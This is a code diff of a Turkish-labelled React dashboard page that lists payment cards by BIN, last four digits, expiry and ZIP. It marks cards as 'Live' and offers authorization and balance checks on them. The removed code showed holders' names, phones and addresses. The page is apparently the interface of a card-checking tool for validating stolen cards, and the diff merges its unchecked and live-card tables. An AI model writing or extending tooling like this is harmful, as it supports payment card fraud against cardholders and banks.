@@ -18,32 +18,19 @@ const styles = `
   }
 
   .unchecked-identity,
-  .unchecked-owner,
   .unchecked-issuer,
   .unchecked-status {
     display: grid;
     gap: 3px;
   }
 
-  .unchecked-identity strong,
-  .unchecked-owner strong {
+  .unchecked-identity strong {
     color: #e4f2e9;
   }
 
   .unchecked-meta {
     color: #8ea49a;
     font-size: 11px;
-  }
-
-  .unchecked-owner {
-    min-width: 190px;
-    max-width: 280px;
-  }
-
-  .unchecked-owner .unchecked-meta {
-    white-space: nowrap;
-    overflow: hidden;
-    text-overflow: ellipsis;
   }
 
   .unchecked-status {
@@ -106,14 +93,6 @@ function StatusPill({ value }) {
   const text = value == null || value === '' ? 'none' : String(value)
   const tone = ['true', 'passed', 'live', 'checked', 'success', 'approved', 'authorized', 'captured', 'verified'].includes(text.toLowerCase()) ? 'good' : 'muted'
   return <span className={`pill ${tone}`}>{text}</span>
-}
-
-function ownerPrimary(card = {}) {
-  return String(card.holderName || '').trim() || 'Sahip bilgisi girilmemiş'
-}
-
-function ownerDetail(card = {}) {
-  return [card.phone, card.address].filter(Boolean).join(' · ') || 'Telefon/adres bilgisi yok'
 }
 
 function cardMeta(card = {}) {
@@ -377,13 +356,6 @@ function AddCardsModal({ value, setValue, feedback, saving, progress, onClose, o
       </article>
     </div>
   )
-}
-
-function formatDate(value) {
-  if (!value) return '-'
-  const date = new Date(value)
-  if (Number.isNaN(date.getTime())) return value
-  return date.toLocaleString()
 }
 
 function permissionMessage(error) {
@@ -826,17 +798,18 @@ export function UncheckedCardsPage({ user, runAction }) {
                   />
                 </th>
                 <th>Kart</th>
-                <th>Kart Sahibi</th>
                 <th>Banka / Ülke</th>
                 <th>Son Kullanma</th>
                 <th>Durum</th>
-                <th>Eklenme</th>
-                <th>İşlem</th>
+                <th>Provizyon</th>
+                <th>Reference</th>
+                <th>Son Sonuç</th>
+                <th>İşlemler</th>
               </tr>
             </thead>
             <tbody>
               {unchecked.rows.map((card) => (
-                <tr key={card.id}>
+                <tr key={`unchecked-${card.id}`}>
                   <td>
                     <input
                       type="checkbox"
@@ -850,12 +823,6 @@ export function UncheckedCardsPage({ user, runAction }) {
                     <div className="unchecked-identity">
                       <strong className="mono">{card.maskedPan || `${card.bin || '------'}******${card.last4 || '----'}`}</strong>
                       <span className="unchecked-meta">{cardMeta(card)}</span>
-                    </div>
-                  </td>
-                  <td title={ownerDetail(card)}>
-                    <div className="unchecked-owner">
-                      <strong>{ownerPrimary(card)}</strong>
-                      <span className="unchecked-meta">{ownerDetail(card)}</span>
                     </div>
                   </td>
                   <td>
@@ -876,7 +843,11 @@ export function UncheckedCardsPage({ user, runAction }) {
                       <div className="unchecked-status-row"><span>Live</span><StatusPill value={card.live} /></div>
                     </div>
                   </td>
-                  <td>{formatDate(card.createdAt)}</td>
+                  <td>-</td>
+                  <td className="mono" title={card.providerReferenceId || ''}>{truncateText(card.providerReferenceId, 25)}</td>
+                  <td className="checked-live-result" title={card.operatorMessage || card.lastCheck?.operatorMessage || ''}>
+                    {truncateText(card.operatorMessage || card.lastCheck?.operatorMessage || '-', 40)}
+                  </td>
                   <td>
                     {canRunAuthCheck
                       ? <button className="small" type="button" onClick={() => openPrompt('unchecked-live', card)}>
@@ -886,52 +857,13 @@ export function UncheckedCardsPage({ user, runAction }) {
                   </td>
                 </tr>
               ))}
-              {uncheckedError && <tr><td colSpan="8" className="muted">{uncheckedError}</td></tr>}
-              {!unchecked.rows.length && !uncheckedError && <tr><td colSpan="8" className="muted">Kayıt yok</td></tr>}
-            </tbody>
-          </table>
-        </div>
-        <PaginationControls pagination={uncheckedPagination} />
-        </section>
-
-        <section className="panel">
-        <div className="section-head">
-          <div>
-            <p className="eyebrow">Live Records</p>
-            <h2>Checked Live Cards</h2>
-          </div>
-          <button className="ghost small" type="button" onClick={() => withLoader(loadCheckedLive, { label: 'Live kartlar yenileniyor', variant: 'logs' })}>
-            Yenile
-          </button>
-        </div>
-        <div className="table-wrap">
-          <table className="checked-live-table">
-            <thead>
-              <tr>
-                <th>Kart</th>
-                <th>Kart Sahibi</th>
-                <th>Banka / Ülke</th>
-                <th>Durum</th>
-                <th>Provizyon</th>
-                <th>Reference</th>
-                <th>Son Sonuç</th>
-                <th>Güncelleme</th>
-                <th>İşlemler</th>
-              </tr>
-            </thead>
-            <tbody>
               {checkedLive.rows.map((card) => (
-                <tr key={card.id}>
+                <tr key={`live-${card.id}`}>
+                  <td><span className="muted">-</span></td>
                   <td>
                     <div className="unchecked-identity">
                       <strong className="mono">{card.maskedPan || `${card.bin || '------'}******${card.last4 || '----'}`}</strong>
                       <span className="unchecked-meta">{cardMeta(card)}</span>
-                    </div>
-                  </td>
-                  <td title={ownerDetail(card)}>
-                    <div className="unchecked-owner">
-                      <strong>{ownerPrimary(card)}</strong>
-                      <span className="unchecked-meta">{ownerDetail(card)}</span>
                     </div>
                   </td>
                   <td>
@@ -940,13 +872,18 @@ export function UncheckedCardsPage({ user, runAction }) {
                       <span className="unchecked-meta">{card.countryCode || 'Ülke yok'} · {card.provider || '-'}</span>
                     </div>
                   </td>
+                  <td>
+                    <div className="unchecked-identity">
+                      <strong>{card.exp || '-'}</strong>
+                      <span className="unchecked-meta">ZIP {card.zip || 'yok'}</span>
+                    </div>
+                  </td>
                   <td><StatusPill value={checkedLiveStatus(card)} /></td>
                   <td><strong>{checkedLiveAmount(card)}</strong></td>
                   <td className="mono" title={card.providerReferenceId || ''}>{truncateText(card.providerReferenceId, 25)}</td>
                   <td className="checked-live-result" title={card.lastMessage || card.lastResult?.responseMessage || ''}>
                     {truncateText(card.lastMessage || card.lastResult?.responseMessage || '-', 40)}
                   </td>
-                  <td>{formatDate(card.updatedAt || card.createdAt)}</td>
                   <td>
                     <div className="checked-live-actions">
                       {canRunAuthCheck && checkedLiveCanRun(card, 'balance') ? <button className="small ghost" type="button" onClick={() => openPrompt('balance', card)}>Balance</button> : null}
@@ -959,12 +896,19 @@ export function UncheckedCardsPage({ user, runAction }) {
                   </td>
                 </tr>
               ))}
+              {uncheckedError && <tr><td colSpan="9" className="muted">{uncheckedError}</td></tr>}
               {checkedLiveError && <tr><td colSpan="9" className="muted">{checkedLiveError}</td></tr>}
-              {!checkedLive.rows.length && !checkedLiveError && <tr><td colSpan="9" className="muted">Live kayıt yok</td></tr>}
+              {!unchecked.rows.length && !checkedLive.rows.length && !uncheckedError && !checkedLiveError && <tr><td colSpan="9" className="muted">Kayıt yok</td></tr>}
             </tbody>
           </table>
         </div>
-        <PaginationControls pagination={livePagination} />
+        <div className="row-actions">
+          <PaginationControls pagination={uncheckedPagination} />
+          <PaginationControls pagination={livePagination} />
+          <button className="ghost small" type="button" onClick={() => withLoader(reloadAll, { label: 'Kart listeleri yenileniyor', variant: 'logs' })}>
+            Yenile
+          </button>
+        </div>
         </section>
       </div>
       <RequestLogPanel logs={requestLogs} title="Unchecked Logs" />
